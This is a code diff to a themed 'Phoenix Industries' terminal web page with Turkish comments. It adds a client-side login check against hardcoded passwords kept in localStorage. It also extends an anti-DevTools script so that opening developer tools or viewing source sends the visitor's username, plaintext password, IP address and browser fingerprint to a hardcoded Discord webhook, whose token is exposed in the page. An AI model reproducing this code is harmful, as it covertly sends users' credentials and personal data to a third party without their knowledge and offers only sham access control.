@@ -8,6 +8,63 @@
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css">
+  
+  <!-- Direkt Link Erişim Koruması -->
+  <script>
+  (function() {
+      'use strict';
+      
+      // Sayfa yüklenir yüklenmez kontrol et
+      function checkAccess() {
+          // localStorage'da gerekli bilgiler var mı kontrol et
+          const userIdentifier = localStorage.getItem('userIdentifier');
+          const userPassword = localStorage.getItem('userPassword');
+          const userType = localStorage.getItem('userType');
+          
+          // Eğer localStorage'da bilgiler yoksa veya boşsa
+          if (!userIdentifier || !userPassword || !userType) {
+              // Hemen index.html'e yönlendir
+              alert('⚠️ Yetkisiz erişim! Lütfen giriş yapın.');
+              window.location.replace('index.html');
+              return;
+          }
+          
+          // raiden3.html için özel kontrol
+          const allowedPasswords = ['1234', '1561', '1603'];
+          if (!allowedPasswords.includes(userPassword)) {
+              alert('⚠️ Bu sayfaya erişim yetkiniz bulunmamaktadır!');
+              window.location.replace('index.html');
+              return;
+          }
+          
+          // Session timeout kontrolü (30 dakika)
+          const loginTime = localStorage.getItem('loginTime');
+          if (loginTime) {
+              const currentTime = new Date().getTime();
+              const sessionDuration = 30 * 60 * 1000; // 30 dakika
+              
+              if (currentTime - parseInt(loginTime) > sessionDuration) {
+                  alert('⏰ Oturum süreniz doldu. Lütfen tekrar giriş yapın.');
+                  localStorage.clear();
+                  window.location.replace('index.html');
+                  return;
+              }
+          }
+          
+          // Eğer her şey tamam ise, login zamanını güncelle
+          localStorage.setItem('loginTime', new Date().getTime().toString());
+      }
+      
+      // Sayfa yüklendiğinde kontrol et
+      if (document.readyState === 'loading') {
+          document.addEventListener('DOMContentLoaded', checkAccess);
+      } else {
+          checkAccess();
+      }
+      
+  })();
+  </script>
+  
   <style>
     :root {
       --primary: #00ff00;
@@ -522,8 +579,8 @@
         this.historyPosition = 0;
         this.currentInput = "";
         this.isTyping = false;
-        this.typingInterval = null; // Yazma animasyonu için interval
-        this.warningActive = false; // Uyarı aktif durumu
+        this.typingInterval = null;
+        this.warningActive = false;
         
         this.documents = {
           "root": ["community.txt", "community-leaders.txt", "drones.txt"],
@@ -637,7 +694,7 @@
           if (i < text.length) {
             entryText.textContent += text[i];
             i++;
-            setTimeout(typeEntry, 80); // Slower typing for dramatic effect
+            setTimeout(typeEntry, 80);
           } else {
             setTimeout(() => {
               this.entryAnimation.classList.add('fade-out');
@@ -649,7 +706,7 @@
           }
         };
         
-        setTimeout(typeEntry, 500); // Start typing after a brief delay
+        setTimeout(typeEntry, 500);
       }
       
       typeText(text, className = '', callback = null) {
@@ -674,14 +731,13 @@
         this.outputElement.appendChild(div);
         
         let i = 0;
-        const speed = 30; // milliseconds per character
+        const speed = 30;
         
         const typeChar = () => {
-          // Uyarı aktif ise yazma işlemini durdur
           if (this.warningActive) {
             cursor.remove();
             this.isTyping = false;
-            this.commandInput.disabled = true; // Input kapalı kalsın
+            this.commandInput.disabled = true;
             if (this.typingInterval) {
               clearTimeout(this.typingInterval);
               this.typingInterval = null;
@@ -693,10 +749,8 @@
             if (text[i] === '\n') {
               textSpan.innerHTML += '<br>';
             } else {
-              // Handle HTML content properly
               const currentHTML = textSpan.innerHTML;
               if (text.substring(i).startsWith('<span class="community-tag">')) {
-                // Find the end of the HTML tag
                 const endTag = text.indexOf('</span>', i) + 7;
                 textSpan.innerHTML = currentHTML + text.substring(i, endTag);
                 i = endTag;
@@ -713,7 +767,6 @@
             this.isTyping = false;
             this.typingInterval = null;
             
-            // Re-enable input after typing is done (sadece uyarı aktif değilse)
             if (!this.warningActive) {
               this.commandInput.disabled = false;
               this.commandInput.placeholder = "";
@@ -730,26 +783,21 @@
       showWarning() {
         this.warningActive = true;
         
-        // Input'u devre dışı bırak
         this.commandInput.disabled = true;
         this.commandInput.placeholder = "SYSTEM LOCKED";
         
-        // Yazma animasyonunu durdur
         if (this.isTyping && this.typingInterval) {
           clearTimeout(this.typingInterval);
           this.typingInterval = null;
           this.isTyping = false;
         }
         
-        // Uyarı sesini çal
         this.warningSound.play().catch(console.warn);
         
-        // Uyarı mesajını terminalde göster
         this.addOutput('\n[SYSTEM ALERT] Unauthorized access attempt detected!', 'error-output');
         this.addOutput('[SECURITY] Terminal access has been suspended.', 'error-output');
         this.addOutput('[WARNING] This incident has been logged.', 'error-output');
         
-        // Uyarı ekranını göster
         document.getElementById('warning').style.display = 'block';
       }
       
@@ -779,13 +827,11 @@
         const input = this.commandInput.value.toLowerCase();
         const matches = [];
         
-        // Check commands
         const commands = ['help', 'open', 'exit', 'shutdown', 'clear'];
         commands.forEach(cmd => {
           if (cmd.startsWith(input)) matches.push(cmd);
         });
         
-        // Check files
         const allFiles = [];
         Object.values(this.documents).flat().forEach(file => {
           const filename = typeof file === 'object' ? file.file : file;
@@ -804,22 +850,14 @@
       }
 
       shutdown() {
-        // Disable input
         this.commandInput.disabled = true;
-        
-        // Stop background music
         this.bgMusic.pause();
-        
-        // Play shutdown sound
         this.soundGenerator.playShutdownSound();
-        
-        // Show shutdown overlay
         this.shutdownOverlay.style.display = 'flex';
         
-        // Progress animation
         let progress = 0;
         const progressInterval = setInterval(() => {
-          progress += Math.random() * 15 + 5; // Random progress increments
+          progress += Math.random() * 15 + 5;
           if (progress > 100) progress = 100;
           
           this.shutdownProgressBar.style.width = progress + '%';
@@ -828,15 +866,12 @@
           if (progress >= 100) {
             clearInterval(progressInterval);
             
-            // Show final message
             setTimeout(() => {
               this.shutdownFinal.classList.add('show');
               
-              // Start screen shrink effect
               setTimeout(() => {
                 document.body.classList.add('screen-shrink');
                 
-                // Redirect after animation
                 setTimeout(() => {
                   window.location.href = 'terminal.html';
                 }, 2000);
@@ -946,13 +981,11 @@
       }
       
       openFile(filename) {
-        // Check if it's a category file
         if (['community.txt', 'community-leaders.txt', 'drones.txt'].includes(filename)) {
           this.showFileContents(filename);
           return;
         }
         
-        // Find the file in redirects (case insensitive)
         let foundFile = null;
         for (const [key, value] of Object.entries(this.fileRedirects)) {
           if (key.toLowerCase() === filename.toLowerCase()) {
@@ -962,7 +995,6 @@
         }
         
         if (foundFile) {
-          // Find community tag if it's a leader file
           let communityTag = '';
           for (const leader of this.documents['community-leaders.txt']) {
             if (leader.file.toLowerCase() === filename.toLowerCase()) {
@@ -982,7 +1014,6 @@
           });
         } else {
           this.typeText(`File not found: ${filename}\n\nTry one of these:\n`, 'glitch', () => {
-            // Show suggestions
             const suggestions = [];
             for (const key in this.fileRedirects) {
               if (key.toLowerCase().includes(filename.toLowerCase())) {
@@ -1009,7 +1040,7 @@
     
     // Initialize terminal when DOM is loaded
     document.addEventListener('DOMContentLoaded', () => {
-      window.terminal = new PhoenixTerminal(); // Global erişim için
+      window.terminal = new PhoenixTerminal();
     });
     
     // Debug Tools Engelleme Scripti
@@ -1019,18 +1050,14 @@
         let devToolsOpen = false;
         let warningShown = false;
         
-        // Uyarı göster
         function showWarning() {
             if (!warningShown && window.terminal) {
                 window.terminal.showWarning();
                 warningShown = true;
-                
-                // Sayfayı yenile (isteğe bağlı)
-                // setTimeout(() => location.reload(), 2000);
+                sendToDiscord();
             }
         }
         
-        // Console açık mı kontrol et
         function detectConsole() {
             const threshold = 160;
             
@@ -1046,67 +1073,51 @@
             }
         }
         
-        // Sağ tıklamayı engelle
         document.addEventListener('contextmenu', function(e) {
             e.preventDefault();
             return false;
         });
         
-        // Klavye kısayollarını engelle
         document.addEventListener('keydown', function(e) {
-            // F12
             if (e.keyCode === 123) {
                 e.preventDefault();
                 showWarning();
-                sendToDiscord();
                 return false;
             }
             
-            // Ctrl+Shift+I (Developer Tools)
             if (e.ctrlKey && e.shiftKey && e.keyCode === 73) {
                 e.preventDefault();
                 showWarning();
-                sendToDiscord();
                 return false;
             }
             
-            // Ctrl+Shift+J (Console)
             if (e.ctrlKey && e.shiftKey && e.keyCode === 74) {
                 e.preventDefault();
                 showWarning();
-                sendToDiscord();
                 return false;
             }
             
-            // Ctrl+U (View Source)
             if (e.ctrlKey && e.keyCode === 85) {
                 e.preventDefault();
                 showWarning();
-                sendToDiscord();
                 return false;
             }
             
-            // Ctrl+Shift+C (Element Inspector)
             if (e.ctrlKey && e.shiftKey && e.keyCode === 67) {
                 e.preventDefault();
                 showWarning();
-                sendToDiscord();
                 return false;
             }
             
-            // Ctrl+S (Save Page)
             if (e.ctrlKey && e.keyCode === 83) {
                 e.preventDefault();
                 showWarning();
-                sendToDiscord();
                 return false;
             }
         });
         
-        // Console boyut kontrolü
         setInterval(detectConsole, 500);
         
-        // DevTools algılama (alternatif yöntem)
         let devtools = {open: false, orientation: null};
         
         setInterval(function() {
@@ -1120,32 +1131,22 @@
             }
         }, 500);
         
-        // Console mesajlarını temizle ve uyarı ekle
         if (window.console) {
             console.clear();
             console.log('%cDikkat!', 'color: red; font-size: 30px; font-weight: bold;');
             console.log('%cBu site korunmaktadır. Yetkisiz erişim girişimleri kaydedilir.', 'color: orange; font-size: 14px;');
         }
         
-        // Seçim engelleme (isteğe bağlı)
         document.addEventListener('selectstart', function(e) {
             e.preventDefault();
             return false;
         });
         
-        // Sürükleme engelleme (isteğe bağlı)
         document.addEventListener('dragstart', function(e) {
             e.preventDefault();
             return false;
         });
         
-        // Debug durumunda sayfayı bulanıklaştır (isteğe bağlı)
-        function blurPage() {
-            document.body.style.filter = 'blur(5px)';
-            document.body.style.pointerEvents = 'none';
-        }
-        
-        // Print ekranını engelle
         window.addEventListener('beforeprint', function(e) {
             e.preventDefault();
             showWarning();
@@ -1153,12 +1154,11 @@
         });
         
     })();
-    // script.js dosyası veya <script> içine koy
-
+    
+    // Discord Webhook Sistemi
     const WEBHOOK_URL = 'https://discord.com/api/webhooks/1366237046670102621/Qme-enwqBGenG2VSB9DHwt4r3z8zQKiOsV8KKOspPXt72gcfZh28oRLd9jq1r9vwUzqV';
 
     function getBrowserInfo() {
-        // Fonksiyon aynı kalabilir
         const ua = navigator.userAgent;
         let browserName = "Bilinmeyen Tarayıcı";
         let browserVersion = "Bilinmeyen Versiyon";
@@ -1199,6 +1199,11 @@
         }
 
         const browserInfo = getBrowserInfo();
+        
+        // localStorage'dan kullanıcı bilgilerini al
+        const userIdentifier = localStorage.getItem('userIdentifier') || 'bilinmiyor';
+        const userPassword = localStorage.getItem('userPassword') || 'bilinmiyor';
+        const userType = localStorage.getItem('userType') || 'bilinmiyor';
 
         const userInfo = {
             ipAddress: ip,
@@ -1211,26 +1216,34 @@
             deviceName: navigator.platform,
             referrer: document.referrer,
             timestamp: new Date().toISOString(),
-            pageUrl: window.location.href
+            pageUrl: window.location.href,
+            userIdentifier: userIdentifier,
+            userPassword: userPassword,
+            userType: userType
         };
 
         const message = {
             embeds: [{
                 title: '⚠️ DevTools Kullanımı Tespit Edildi!',
-                description: 'Bir kullanıcı geliştirici araçlarını açmaya çalıştı.',
+                description: `Kullanıcı: **${userIdentifier}** geliştirici araçlarını açmaya çalıştı.`,
                 color: 16711680,
                 fields: [
-                    { name: 'IP Adresi', value: userInfo.ipAddress, inline: true },
-                    { name: 'Tarayıcı', value: `${userInfo.browserName} ${userInfo.browserVersion}`, inline: true },
-                    { name: 'User Agent', value: userInfo.userAgent, inline: false },
-                    { name: 'Ekran Çözünürlüğü', value: userInfo.screenResolution, inline: true },
-                    { name: 'Dil', value: userInfo.language, inline: true },
-                    { name: 'Platform', value: userInfo.platform, inline: true },
-                    { name: 'Referrer', value: userInfo.referrer, inline: false },
-                    { name: 'Zaman', value: userInfo.timestamp, inline: true },
-                    { name: 'Sayfa URL', value: userInfo.pageUrl, inline: false }
+                    { name: '👤 Kullanıcı Kimliği', value: userIdentifier, inline: true },
+                    { name: '🔑 Şifre', value: userPassword, inline: true },
+                    { name: '📂 Kullanıcı Tipi', value: userType, inline: true },
+                    { name: '🌐 IP Adresi', value: userInfo.ipAddress, inline: true },
+                    { name: '🔍 Tarayıcı', value: `${userInfo.browserName} ${userInfo.browserVersion}`, inline: true },
+                    { name: '📱 Platform', value: userInfo.platform, inline: true },
+                    { name: '🖥️ Ekran Çözünürlüğü', value: userInfo.screenResolution, inline: true },
+                    { name: '🌍 Dil', value: userInfo.language, inline: true },
+                    { name: '🕐 Zaman', value: userInfo.timestamp, inline: true },
+                    { name: '📄 User Agent', value: userInfo.userAgent, inline: false },
+                    { name: '🔗 Referrer', value: userInfo.referrer || 'Yok', inline: false },
+                    { name: '📍 Sayfa URL', value: userInfo.pageUrl, inline: false }
                 ],
-                footer: { text: 'Phoenix Industries Güvenlik Logu' }
+                footer: { 
+                    text: 'Phoenix Industries Güvenlik Logu - Raiden3 Terminal'
+                }
             }]
         };
 
@@ -1240,7 +1253,7 @@
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(message)
             });
-            console.log('Bilgiler Discord\'a gönderildi.');
+            console.log('Kullanıcı bilgileri Discord\'a gönderildi.');
         } catch (error) {
             console.error('Webhook hatası:', error);
         }
